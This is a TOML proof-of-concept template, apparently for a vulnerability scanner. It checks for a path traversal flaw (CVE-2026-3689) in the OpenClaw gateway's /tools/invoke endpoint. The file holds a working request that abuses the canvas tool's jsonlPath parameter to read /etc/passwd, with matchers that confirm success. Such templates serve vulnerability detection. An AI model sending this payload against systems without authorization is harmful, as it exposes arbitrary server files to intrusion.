[info]
author = "ave"
description = "通过向 OpenClaw 网关的 /tools/invoke 端点发送 POST 请求，利用 canvas 工具的 a2ui_push 动作中的 jsonlPath 参数进行路径遍历，读取服务账户权限下的任意文件。需要有效的 Bearer token 进行身份认证。"
id = "POC-AVE-2026-0972"
name = "OpenClaw Canvas Path Traversal PoC"
severity = "medium"
tags = ["ave-2026-0972"]
vuln_id = [
    "CVE-2026-3689",
    "AVE-2026-0972",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/tools/invoke"
protocol = "http"

[poc.requests.body]
content = '{"tool":"canvas","args":{"action":"a2ui_push","jsonlPath":"/etc/passwd","node":"node-host"}}'
type = "json"

[poc.requests.headers]
Authorization = "Bearer {{token}}"
Content-Type = "application/json"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["ok"]
